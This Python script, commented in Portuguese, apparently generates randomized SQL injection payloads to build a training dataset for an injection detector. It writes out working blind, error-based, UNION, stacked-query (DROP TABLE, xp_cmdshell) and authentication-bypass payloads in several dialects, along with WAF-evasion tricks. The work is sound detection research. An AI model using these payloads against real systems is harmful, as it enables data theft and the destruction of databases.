#!/usr/bin/env python
# Gerador de payloads SQLi mais realista e diverso, para substituir a lista de
# 20 literais fixos do gerar_dataset_artificial.py original.
#
# Inspirado na taxonomia de tecnicas dos geradores classicos de codigo aberto
# (sqlmap - payloads/*.xml; PayloadsAllTheThings - SQL Injection):
#   boolean-based blind, time-based blind, error-based, UNION-based,
#   stacked queries e bypass de autenticacao/injecao minima.
#
# Duas correcoes em relacao ao original, motivadas pela analise dos falsos
# negativos da Fusao balanceada contra o CSIC decodificado:
#
#  (a) DISTRIBUICAO: o original era ~41% tautologia "OR" (' OR '1'='1), tecnica
#      que quase nao aparece em trafego automatizado real, e subrepresentava
#      time-based (5%) e stacked (15%) - que dominam o CSIC (52% e 62%). Os
#      pesos aqui refletem o que ferramentas automatizadas de fato geram:
#      time-based e stacked ganham peso, tautologia perde.
#
#  (b) CARDINALIDADE: em vez de literais fixos, cada payload e PARAMETRIZADO -
#      numeros/marcadores/nomes aleatorios (como o "AND 1234=1234" do sqlmap),
#      varios dialetos (MySQL SLEEP, Postgres pg_sleep, MSSQL WAITFOR, Oracle
#      dbms_pipe), varios estilos de comentario e de fechamento de contexto
#      (aspa simples, aspa dupla, numerico, parenteses). Isso gera milhares de
#      variantes distintas em vez de 20 repetidas ~125x cada.
#
# Nao e copia do CSIC: e uma distribuicao de tecnicas plausivel para ataque
# automatizado, que por consequencia cobre melhor os padroes reais.

import random
import string

# ---------------------------------------------------------------------------
# blocos reutilizaveis
# ---------------------------------------------------------------------------
COMENTARIOS = ["-- -", "-- ", "--", "#", "/*", ""]        # como o payload termina
FECHAMENTOS = ["'", "\"", "", ")", "')", "\")", "))", "'))"]  # como fecha o contexto atual

COLUNAS = ["username", "password", "user", "pass", "senha", "login", "email",
           "id", "nome", "credit_card", "token", "role", "admin"]
TABELAS = ["usuarios", "users", "clientes", "admin", "contas", "membros",
           "pedidos", "produtos", "login", "credenciais"]


def _n():
    """Numero aleatorio de 3-4 digitos, como os marcadores do sqlmap."""
    return random.randint(100, 9999)


def _marcador():
    """Par igual (verdadeiro) ou diferente (falso) para blind booleano."""
    a = _n()
    return a, a if random.random() < 0.5 else _n()


def _rand_cols(k=None):
    k = k or random.randint(1, 4)
    return ",".join(random.choice(["NULL"] + COLUNAS) for _ in range(k))


# ---------------------------------------------------------------------------
# tecnicas (cada uma devolve o corpo do payload, sem o fechamento inicial)
# ---------------------------------------------------------------------------
def t_boolean_blind():
    a, b = _marcador()
    op = random.choice(["AND", "OR"])
    formas = [
        f"{op} {a}={b}",
        f"{op} '{a}'='{b}'",
        f"{op} {a}={b} AND '{_n()}'='{_n()}",
        f"{op} ({a}={b})",
    ]
    return random.choice(formas)


def t_time_based():
    seg = random.choice([3, 5, 10, 15])
    n = _n()
    dialetos = [
        f"; WAITFOR DELAY '0:0:{seg}'",           # MSSQL
        f") WAITFOR DELAY '0:0:{seg}'",
        f"AND {n}=(SELECT {n} FROM PG_SLEEP({seg}))",   # Postgres
        f"OR SLEEP({seg})",                        # MySQL
        f"AND SLEEP({seg})",
        f"AND (SELECT {n} FROM (SELECT(SLEEP({seg})))a)",
        f"OR pg_sleep({seg})",
        f"; SELECT SLEEP({seg})",
        f"AND BENCHMARK(10000000,MD5('{random.choice(string.ascii_lowercase)}'))",  # MySQL cpu
        f"AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('{random.choice(string.ascii_lowercase)}',{seg})",  # Oracle
    ]
    return random.choice(dialetos)


def t_error_based():
    n = _n()
    formas = [
        f"AND extractvalue({random.randint(1,9)},concat(0x7e,(SELECT version())))",
        f"AND extractvalue({random.randint(1,9)},concat(0x7e,(SELECT {random.choice(COLUNAS)} FROM {random.choice(TABELAS)} LIMIT 1)))",
        f"AND updatexml({random.randint(1,9)},concat(0x7e,(SELECT database())),{random.randint(1,9)})",
        f"AND {n}=CONVERT(int,(SELECT @@version))",          # MSSQL
        f"AND {n}=CAST((SELECT {random.choice(COLUNAS)} FROM {random.choice(TABELAS)} LIMIT 1) AS int)",
        f"AND GTID_SUBSET(CONCAT(0x7e,(SELECT {random.choice(COLUNAS)} FROM {random.choice(TABELAS)} LIMIT 1)),{n})",
        f"AND (SELECT {n} FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ]
    return random.choice(formas)


def t_union():
    cols = _rand_cols()
    formas = [
        f"UNION SELECT {cols}",
        f"UNION ALL SELECT {cols}",
        f"UNION SELECT {cols} FROM {random.choice(TABELAS)}",
        f"UNION SELECT {_rand_cols(2)} FROM information_schema.tables",
        f"UNION SELECT {random.choice(COLUNAS)},{random.choice(COLUNAS)} FROM {random.choice(TABELAS)}",
    ]
    return random.choice(formas)


def t_stacked():
    n = _n()
    formas = [
        f"; DROP TABLE {random.choice(TABELAS)}",
        f"; DELETE FROM {random.choice(TABELAS)}",
        f"; INSERT INTO {random.choice(TABELAS)} VALUES ({n},'{random.choice(string.ascii_lowercase)}')",
        f"; UPDATE {random.choice(TABELAS)} SET {random.choice(COLUNAS)}='{n}'",
        f"; WAITFOR DELAY '0:0:{random.choice([3,5,10])}'",
        f"; EXEC xp_cmdshell('dir')",
        f"; SELECT * FROM {random.choice(TABELAS)}",
    ]
    return random.choice(formas)


def t_auth_bypass():
    formas = [
        "OR 1=1",
        f"OR {_n()}={_n() if random.random()<0.3 else 'x'}".replace("=x", "=" + str(random.randint(1,9))),
        "OR 1=1 LIMIT 1",
        "admin'--",
        "admin'#",
        f"' OR '{_n()}'='{_n()}",
        "OR ''='",
        "') OR ('1'='1",
    ]
    return random.choice(formas)


# distribuicao de tecnicas (soma ~1.0). time-based e stacked com peso alto,
# como em trafego automatizado real; tautologia pura (auth_bypass) reduzida.
TECNICAS = [
    (t_boolean_blind, 0.24),
    (t_time_based,    0.24),
    (t_stacked,       0.18),
    (t_error_based,   0.14),
    (t_union,         0.12),
    (t_auth_bypass,   0.08),
]


def _obfuscar_espacos(p):
    """Ocasionalmente troca espacos por /**/ (evasao classica de WAF)."""
    if random.random() < 0.12:
        return p.replace(" ", "/**/")
    return p


def _talvez_case_misto(p):
    """Ocasionalmente randomiza a caixa das palavras-chave."""
    if random.random() < 0.10:
        return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p)
    return p


def gerar_payload_sqli():
    """Monta um payload SQLi completo: fechamento de contexto + tecnica +
    comentario, com ofuscacao ocasional. Cardinalidade alta (parametrizado)."""
    tecnica = random.choices([t for t, _ in TECNICAS],
                             weights=[w for _, w in TECNICAS])[0]
    corpo = tecnica()

    # tecnicas stacked/time-based ja podem trazer o proprio ; ou ) na frente;
    # para as demais, prefixa um fechamento de contexto (aspa/parenteses/etc.)
    if corpo.startswith((";", ")")):
        fechamento = "" if random.random() < 0.5 else random.choice(["'", "\""])
        payload = f"{fechamento}{corpo}"
    else:
        fechamento = random.choice(FECHAMENTOS)
        sep = "" if not fechamento else " "
        payload = f"{fechamento}{sep}{corpo}"

    comentario = random.choice(COMENTARIOS)
    if comentario:
        payload = f"{payload}{comentario}"

    payload = _obfuscar_espacos(payload)
    payload = _talvez_case_misto(payload)
    return payload


if __name__ == "__main__":
    # amostra rapida para inspecao visual
    random.seed(42)
    from collections import Counter
    amostras = [gerar_payload_sqli() for _ in range(30)]
    for a in amostras:
        print(" ", a)
    print(f"\nunicos em 5000: {len(set(gerar_payload_sqli() for _ in range(5000)))}")
